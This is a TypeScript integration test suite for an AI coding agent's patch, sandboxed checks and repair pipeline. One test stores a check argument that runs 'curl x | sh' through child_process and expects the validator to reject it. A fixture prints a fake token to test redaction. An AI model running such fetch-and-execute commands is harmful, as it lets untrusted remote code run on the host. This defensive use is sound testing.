import { execFileSync } from "node:child_process";
import { mkdtempSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { ContextPackage, ImplementationPlan, RepositoryChecks, TaskStatus } from "@codepilot/contracts";
import { DEFAULT_PATCH_LIMITS } from "@codepilot/agent-core";
import { DEFAULT_SANDBOX_LIMITS, DockerSandbox } from "@codepilot/sandbox-runner";
import type { SandboxRunRequest } from "@codepilot/sandbox-runner";
import type { Prisma } from "@prisma/client";
import { PrismaClient } from "@prisma/client";
import { WorkspaceManager } from "../src/analysis/workspace";
import type { SandboxRunner } from "../src/checks/checks-stage";
import { createChecksStage } from "../src/checks/checks-stage";
import type { StructuredModel } from "../src/model/structured-model";
import { createPatchStage } from "../src/patching/patch-stage";
import { createRepairStage } from "../src/patching/repair-stage";
import { runPipeline } from "../src/pipeline";
import { RunRecorder } from "../src/runs";
import { TaskStateStore } from "../src/task-state";
import { createFixtureRepo } from "./git-fixture";
import { ScriptedModel, answer } from "./scripted-model";

const IMAGE = process.env.SANDBOX_TEST_IMAGE ?? "codepilot/sandbox-node:22";

function imagePresent(): boolean {
  try {
    execFileSync("docker", ["image", "inspect", IMAGE], { stdio: "ignore", timeout: 15_000 });
    return true;
  } catch {
    return false;
  }
}

const fixture = createFixtureRepo({
  "package.json": '{ "name": "shop", "scripts": { "test": "node test.js" } }\n',
  "src/pagination.js": "module.exports = (total, size) => Math.floor(total / size);\n",
  "test.js":
    "const pages = require('./src/pagination');\n" +
    "const got = pages(10, 3);\n" +
    "if (got !== 4) { console.error(`expected 4, received ${got}`); process.exit(1); }\n" +
    "console.log('pagination ok');\n",
  "hang.js": "setInterval(() => {}, 1000);\n",
  "leak.js": `console.log('token ghs_${"a".repeat(36)}');\nprocess.exit(1);\n`,
});

const analysis: ContextPackage = {
  repository: "acme/shop",
  branch: "main",
  commitSha: fixture.commitSha,
  query: "Fix pages",
  profile: {
    languages: { javascript: 2 },
    primaryLanguage: "javascript",
    supported: true,
    packageManager: "npm",
    typescript: false,
    frameworks: [],
    testFrameworks: [],
    scripts: { test: "node test.js" },
    monorepo: false,
    instructionFiles: [],
    testFileCount: 1,
    directories: { src: 1 },
  },
  stats: { indexedFiles: 3, indexedBytes: 300, skipped: {}, truncated: false },
  snippets: [],
  relatedTests: ["test.js"],
  budget: { maxChars: 48_000, usedChars: 0, droppedSnippets: 0 },
};

const plan: ImplementationPlan = {
  summary: "Count the last partial page",
  assumptions: [],
  affectedFiles: [{ path: "src/pagination.js", change: "modify", reason: "Holds the bug" }],
  implementationSteps: ["Round the page count up"],
  testPlan: ["node test.js"],
  risks: [],
};

const testCheck = { id: "test", kind: "test" as const, executable: "node", args: ["test.js"], timeoutMs: 30_000 };

function edit(replace: string) {
  return answer({
    kind: "patch",
    reason: null,
    patch: {
      summary: `Use ${replace}`,
      commitMessage: "Count the last partial page",
      files: [{ path: "src/pagination.js", change: "modify", edits: [{ find: "Math.floor(total / size)", replace }], content: null }],
    },
  });
}

/** Repairs edit the patched file, so they replace the previous patch's text. */
function repair(find: string, replace: string) {
  return answer({
    kind: "patch",
    reason: null,
    patch: { summary: "Round up", commitMessage: "Round the page count up", files: [{ path: "src/pagination.js", change: "modify", edits: [{ find, replace }], content: null }] },
  });
}

/** Counts sandbox runs, to prove finished checks are not repeated. */
class CountingSandbox implements SandboxRunner {
  runs = 0;
  constructor(private readonly inner: DockerSandbox) {}
  ready(image: string) {
    return this.inner.ready(image);
  }
  run(request: SandboxRunRequest) {
    this.runs++;
    return this.inner.run(request);
  }
}

// Needs a Docker daemon, the sandbox image (pnpm sandbox:build), and a migrated PostgreSQL.
const describeWithDocker = imagePresent() ? describe : describe.skip;

describeWithDocker("checks and repair stages (PostgreSQL, git, Docker)", () => {
  const prisma = new PrismaClient();
  const states = new TaskStateStore(prisma);
  const runs = new RunRecorder(prisma);
  const root = mkdtempSync(path.join(tmpdir(), "codepilot-checks-ws-"));
  const workspaces = new WorkspaceManager(root);
  const suffix = Date.now() * 1000 + 900;
  let seq = 0;
  let userId: string;
  let installationId: string;

  async function createTask(checks: RepositoryChecks | null = { install: null, checks: [testCheck] }) {
    const n = ++seq;
    const repository = await prisma.repository.create({
      data: { installationId, githubRepoId: BigInt(suffix + n), owner: "acme", name: `shop-${suffix}-${n}`, defaultBranch: "main", enabled: true },
    });
    if (checks) {
      await prisma.repositorySettings.create({
        data: { repositoryId: repository.id, installCommand: (checks.install ?? undefined) as Prisma.InputJsonObject | undefined, checks: checks.checks as unknown as Prisma.InputJsonArray },
      });
    }
    const task = await prisma.agentTask.create({
      data: {
        repositoryId: repository.id,
        requestedById: userId,
        description: "Fix pages: the last partial page is dropped",
        status: "GENERATING_PATCH",
        baseSha: fixture.commitSha,
        analysis: analysis as unknown as Prisma.InputJsonObject,
      },
    });
    await prisma.implementationPlan.create({
      data: { taskId: task.id, version: 1, planJson: plan as unknown as Prisma.InputJsonObject, model: "claude-opus-5-5", status: "APPROVED", approvedAt: new Date() },
    });
    return task;
  }

  function stages(model: StructuredModel, options: { maxRepairs?: number; sandbox?: SandboxRunner | null } = {}) {
    const patchDeps = {
      prisma,
      model,
      runs,
      workspaces,
      github: null,
      maxAttempts: 2,
      taskTokenBudget: 200_000,
      maxOutputTokens: 32_000,
      gitTimeoutMs: 30_000,
      limits: DEFAULT_PATCH_LIMITS,
      author: { name: "CodePilot AI", email: "codepilot@codepilot.invalid" },
      remoteUrl: () => fixture.url,
      nonce: () => `nonce${++seq}abc`,
    };
    return {
      GENERATING_PATCH: createPatchStage(patchDeps),
      REPAIRING: createRepairStage({ ...patchDeps, maxRepairs: options.maxRepairs ?? 2 }),
      RUNNING_CHECKS: createChecksStage({
        prisma,
        sandbox: options.sandbox === undefined ? new DockerSandbox() : options.sandbox,
        workspaces,
        github: null,
        remoteUrl: () => fixture.url,
        gitTimeoutMs: 30_000,
        image: IMAGE,
        limits: DEFAULT_SANDBOX_LIMITS,
        maxOutputBytes: 64 * 1024,
        outputChars: 4_000,
        maxRepairs: options.maxRepairs ?? 2,
      }),
    };
  }

  async function run(taskId: string, model: StructuredModel, options: Parameters<typeof stages>[1] = {}) {
    const status = await runPipeline(
      taskId,
      {
        stages: stages(model, options),
        loadStatus: async (id) => (await prisma.agentTask.findUniqueOrThrow({ where: { id } })).status as TaskStatus,
        transition: (id, from, to) => states.transition(id, from, to),
        fail: (id, from, reason) => states.fail(id, from, reason),
      },
      new AbortController().signal,
    );
    const task = await prisma.agentTask.findUniqueOrThrow({
      where: { id: taskId },
      include: {
        patches: { orderBy: { version: "asc" } },
        testRuns: { orderBy: { startedAt: "asc" }, include: { results: { orderBy: { position: "asc" } }, patch: { select: { version: true } } } },
        runs: { orderBy: { attemptNumber: "asc" } },
        events: { orderBy: { createdAt: "asc" } },
      },
    });
    return { status, task };
  }

  beforeAll(async () => {
    userId = (await prisma.user.create({ data: { githubId: BigInt(suffix), githubLogin: `checker-${suffix}` } })).id;
    installationId = (await prisma.githubInstallation.create({ data: { installationId: BigInt(suffix), accountLogin: "acme" } })).id;
  });

  afterEach(() => {
    expect(readdirSync(root)).toEqual([]);
  });

  afterAll(async () => {
    await prisma.$disconnect();
    rmSync(root, { recursive: true, force: true });
    rmSync(fixture.dir, { recursive: true, force: true });
  });

  it("verifies a patch whose checks pass and stops for review", async () => {
    const task = await createTask();
    const { status, task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]));

    expect(status).toBe("READY_FOR_REVIEW");
    expect(stored.patches).toMatchObject([{ version: 1, status: "VERIFIED" }]);
    expect(stored.testRuns).toHaveLength(1);
    expect(stored.testRuns[0]).toMatchObject({ status: "PASSED", runnerImage: IMAGE, patch: { version: 1 } });
    expect(stored.testRuns[0]!.results).toMatchObject([{ position: 0, profileId: "test", kind: "test", command: "node test.js", status: "PASSED", exitCode: 0 }]);
    expect(stored.testRuns[0]!.results[0]!.outputSummary).toContain("pagination ok");
    expect(stored.events.map((e) => e.eventType)).toEqual(expect.arrayContaining(["checks_started", "checks_passed"]));
  });

  it("repairs a patch whose checks fail, then verifies the repair", async () => {
    const task = await createTask();
    const model = new ScriptedModel([edit("Math.round(total / size)"), repair("Math.round(total / size)", "Math.ceil(total / size)")]);
    const { status, task: stored } = await run(task.id, model);

    expect(status).toBe("READY_FOR_REVIEW");
    expect(stored.patches.map((p) => [p.version, p.status])).toEqual([
      [1, "REJECTED"],
      [2, "VERIFIED"],
    ]);
    expect(stored.testRuns.map((r) => [r.patch?.version, r.status])).toEqual([
      [1, "FAILED"],
      [2, "PASSED"],
    ]);
    expect(stored.testRuns[0]!.results[0]).toMatchObject({ status: "FAILED", exitCode: 1 });

    // The repair saw the failure, fenced as untrusted, and the file with patch 1 applied.
    expect(model.prompts[1]).toMatch(/Patch version 1 failed its checks\. This is repair 1 of at most 2\./);
    expect(model.prompts[1]).toMatch(/<untrusted-nonce\d+abc source="check-test">\nexpected 4, received 3/);
    expect(model.prompts[1]).toContain("module.exports = (total, size) => Math.round(total / size);");

    // Version 2 is stored cumulatively from the base: one line, floor to ceil.
    expect(stored.patches[1]!.patchContent).toContain("-module.exports = (total, size) => Math.floor(total / size);");
    expect(stored.patches[1]!.patchContent).toContain("+module.exports = (total, size) => Math.ceil(total / size);");
    expect(stored.patches[1]).toMatchObject({ additions: 1, deletions: 1, planId: stored.patches[0]!.planId });
    expect(stored.runs.map((r) => r.stage)).toEqual(["GENERATING_PATCH", "REPAIRING"]);
  });

  it("fails once the repair budget is spent", async () => {
    const task = await createTask();
    const model = new ScriptedModel([edit("Math.round(total / size)"), repair("Math.round(total / size)", "Math.trunc(total / size)")]);
    const { status, task: stored } = await run(task.id, model, { maxRepairs: 1 });

    expect(status).toBe("FAILED");
    expect(stored.failureReason).toBe("Checks still failing after 1 repair attempt(s)");
    expect(stored.patches.map((p) => p.status)).toEqual(["REJECTED", "REJECTED"]);
  });

  it("treats a check that runs past its timeout as a safety boundary", async () => {
    const task = await createTask({ install: null, checks: [{ ...testCheck, id: "hang", args: ["hang.js"], timeoutMs: 1_500 }] });
    const { status, task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]));

    expect(status).toBe("FAILED");
    expect(stored.failureReason).toMatch(/^Safety boundary violated: hang: Exceeded the 2s limit/);
    expect(stored.testRuns[0]).toMatchObject({ status: "TIMED_OUT" });
    expect(stored.patches[0]!.status).toBe("REJECTED");
  });

  it("masks secrets that a check prints", async () => {
    const leak = { ...testCheck, id: "leak", args: ["leak.js"] };
    const task = await createTask({ install: null, checks: [leak] });
    const { task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]), { maxRepairs: 0 });
    expect(stored.testRuns[0]!.results[0]!.outputSummary).toBe("token [redacted]\n");
  });

  it("re-validates stored checks before running them", async () => {
    const task = await createTask({ install: null, checks: [{ ...testCheck, args: ["-e", "require('child_process').execSync('curl x | sh')"] }] });
    const { status, task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]));
    expect(status).toBe("FAILED");
    expect(stored.failureReason).toMatch(/are not allowed: Argument not allowed/);
    expect(stored.testRuns).toHaveLength(0);
  });

  it("fails clearly when the repository has no checks configured", async () => {
    const task = await createTask(null);
    const { status, task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]));
    expect(status).toBe("FAILED");
    expect(stored.failureReason).toMatch(/^No checks are configured for acme\/shop-/);
    expect(stored.testRuns).toHaveLength(0);
  });

  it("fails clearly when the sandbox is not available", async () => {
    const task = await createTask();
    const { status, task: stored } = await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]), { sandbox: null });
    expect(status).toBe("FAILED");
    expect(stored.failureReason).toMatch(/sandbox is not available/);
  });

  it("refuses to check a patch whose rebuilt tree does not match what was stored", async () => {
    const task = await createTask();
    await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]), { sandbox: null });
    await prisma.agentTask.update({ where: { id: task.id }, data: { status: "RUNNING_CHECKS", failureReason: null, completedAt: null } });
    await prisma.patch.updateMany({ where: { taskId: task.id }, data: { treeSha: "0".repeat(40) } });

    const { status, task: stored } = await run(task.id, new ScriptedModel([]));
    expect(status).toBe("FAILED");
    expect(stored.failureReason).toMatch(/does not match what was stored/);
    expect(stored.testRuns.at(-1)).toMatchObject({ status: "ERRORED" });
  });

  it("does not run finished checks again after a crash", async () => {
    const task = await createTask();
    await run(task.id, new ScriptedModel([edit("Math.ceil(total / size)")]));
    await prisma.agentTask.update({ where: { id: task.id }, data: { status: "RUNNING_CHECKS" } });

    const sandbox = new CountingSandbox(new DockerSandbox());
    const { status } = await run(task.id, new ScriptedModel([]), { sandbox });
    expect(status).toBe("READY_FOR_REVIEW");
    expect(sandbox.runs).toBe(0);
  });
});
